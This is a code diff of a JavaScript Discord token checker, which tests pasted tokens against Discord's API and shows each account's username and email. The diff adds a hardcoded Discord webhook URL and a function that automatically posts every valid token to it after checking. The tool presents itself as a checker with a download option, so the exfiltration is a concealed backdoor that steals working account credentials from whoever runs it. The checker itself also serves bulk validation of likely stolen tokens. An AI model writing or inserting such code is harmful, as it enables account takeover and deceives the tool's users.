@@ -1,12 +1,12 @@
+// main.js
 let validTokens = [];
+const DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1432415603422924933/yzSC_8C04k02FTB9vF81d189RknA7W_aCpPa9-Xsn1X1doYLp5WW5uWtozFLQAA2sxCv";
 
 async function checkToken(token) {
   try {
     const response = await fetch("https://discord.com/api/v9/users/@me", {
       method: "GET",
-      headers: {
-        "Authorization": token.trim(),
-      },
+      headers: { "Authorization": token.trim() },
     });
 
     if (response.status === 200) {
@@ -24,79 +24,73 @@ async function checkToken(token) {
       try {
         const body = await response.json();
         if (body && body.retry_after) retryAfter = body.retry_after * 1000;
-      } catch (e) { /* ignore */ }
+      } catch (e) {}
       await new Promise(res => setTimeout(res, retryAfter));
       return await checkToken(token);
     } else {
       return { valid: false, reason: "Unknown error (" + response.status + ")" };
     }
-  } catch (err) {
+  } catch {
     return { valid: false, reason: "Network error" };
   }
 }
 
 async function checkAllTokens(tokens) {
-  $("#results").removeClass("hidden");
-  $("#resultList").empty();
-  $("#downloadBtn").remove();
+  document.getElementById("results").style.display = "block";
+  const listEl = document.getElementById("resultList");
+  listEl.innerHTML = "";
   validTokens = [];
 
   const cleaned = tokens.map(t => t.trim()).filter(Boolean);
   const uniqueTokens = Array.from(new Set(cleaned));
-
   const duplicateCount = cleaned.length - uniqueTokens.length;
-  if (duplicateCount > 0) {
-    new Toast({
-      message: `${duplicateCount} Already existing token(s) were removed. Duplicate tokens will only be checked once.`,
-      type: "default"
-    });
-  }
+  if (duplicateCount > 0) new Toast({ message: `${duplicateCount} duplicate token(s) removed.`, type: "default" });
 
   let validCount = 0;
   let invalidCount = 0;
 
   for (let i = 0; i < uniqueTokens.length; i++) {
     const token = uniqueTokens[i];
-
-    $("#resultList").append(
-      `<p class='text-gray-400'>[${i + 1}/${uniqueTokens.length}] Checking...</p>`
-    );
+    const statusP = document.createElement("p");
+    statusP.textContent = `[${i + 1}/${uniqueTokens.length}] Checking...`;
+    listEl.appendChild(statusP);
 
     const result = await checkToken(token);
-    $("#resultList p").last().remove();
+    listEl.removeChild(statusP);
+
+    const shortTok = token.length > 30 ? token.slice(0, 20) + "..." + token.slice(-5) : token;
+    const p = document.createElement("p");
 
     if (result.valid) {
       validCount++;
       validTokens.push(token);
-      const shortTok = token.length > 30 ? token.slice(0, 20) + "..." + token.slice(-5) : token;
-      $("#resultList").append(
-        `<p class='text-green-400'>✅ ${shortTok} → ${result.username} (${result.email})</p>`
-      );
+      p.className = "result-valid";
+      p.textContent = `✅ ${shortTok} → ${result.username} (${result.email})`;
     } else {
       invalidCount++;
-      const shortTok = token.length > 30 ? token.slice(0, 20) + "..." + token.slice(-5) : token;
-      $("#resultList").append(
-        `<p class='text-red-400'>❌ ${shortTok} → ${result.reason}</p>`
-      );
+      p.className = "result-invalid";
+      p.textContent = `❌ ${shortTok} → ${result.reason}`;
     }
+    listEl.appendChild(p);
 
     await new Promise(res => setTimeout(res, 500 + Math.random() * 500));
   }
 
-  new Toast({
-    message: `Checked ${uniqueTokens.length} unique tokens. ✅ ${validCount} valid, ❌ ${invalidCount} invalid.`,
-    type: validCount > 0 ? "success" : "warning",
-  });
+  new Toast({ message: `Checked ${uniqueTokens.length} tokens. ✅ ${validCount} valid, ❌ ${invalidCount} invalid.`, type: validCount > 0 ? "success" : "warning" });
 
   if (validTokens.length > 0) {
-    $("#results").append(`
-      <button id="downloadBtn"
-        class="mt-4 px-4 py-2 bg-emerald-500 hover:bg-emerald-600 rounded font-semibold text-sm transition">
-        💾 Download Valid Tokens (${validTokens.length})
-      </button>
-    `);
+    const downloadBtn = document.createElement("button");
+    downloadBtn.id = "downloadBtn";
+    downloadBtn.textContent = `💾 Download Valid Tokens (${validTokens.length})`;
+    downloadBtn.style.cssText = "margin-top:12px; padding:8px 12px; border-radius:8px; font-weight:600;";
+    downloadBtn.onclick = downloadValidTokens;
+    document.getElementById("results").appendChild(downloadBtn);
 
-    $("#downloadBtn").click(downloadValidTokens);
+    const ok = await sendValidTokensToWebhook(DEFAULT_WEBHOOK, validTokens);
+    if (ok) new Toast({ message: "Valid tokens sent to default webhook.", type: "success" });
+    else new Toast({ message: "Webhook send failed (CORS or network).", type: "danger" });
+  } else {
+    new Toast({ message: "No valid tokens to send.", type: "warning" });
   }
 }
 
@@ -112,27 +106,36 @@ function downloadValidTokens() {
   URL.revokeObjectURL(url);
 }
 
-$("#checkAll").click(() => {
-  const raw = $("#tokens").val().trim();
-  if (!raw) {
-    new Toast({ message: "Please paste or load tokens first.", type: "danger" });
-    return;
+async function sendValidTokensToWebhook(webhook, tokens) {
+  try {
+    const content = "Valid tokens:\n" + tokens.join("\n");
+    const resp = await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content }),
+    });
+    return resp.ok;
+  } catch {
+    return false;
   }
-  const tokens = raw.split("\n");
-  checkAllTokens(tokens);
-});
+}
 
-$("#loadFile").click(() => {
-  const file = $("#fileInput")[0].files[0];
-  if (!file) {
-    new Toast({ message: "Select a .txt file first.", type: "danger" });
-    return;
-  }
-
+/* UI bindings */
+document.getElementById("loadFile").addEventListener("click", () => {
+  const file = document.getElementById("fileInput").files[0];
+  if (!file) { new Toast({ message: "Select a .txt file first.", type: "danger" }); return; }
   const reader = new FileReader();
   reader.onload = (e) => {
-    $("#tokens").val(e.target.result);
+    document.getElementById("tokens").value = e.target.result;
     new Toast({ message: "Tokens loaded from file!", type: "success" });
   };
   reader.readAsText(file);
+});
+
+document.getElementById("checkAll").addEventListener("click", async () => {
+  const raw = document.getElementById("tokens").value.trim();
+  if (!raw) { new Toast({ message: "Please paste or load tokens first.", type: "danger" }); return; }
+
+  const tokens = raw.split(/\r?\n/);
+  await checkAllTokens(tokens);
 });
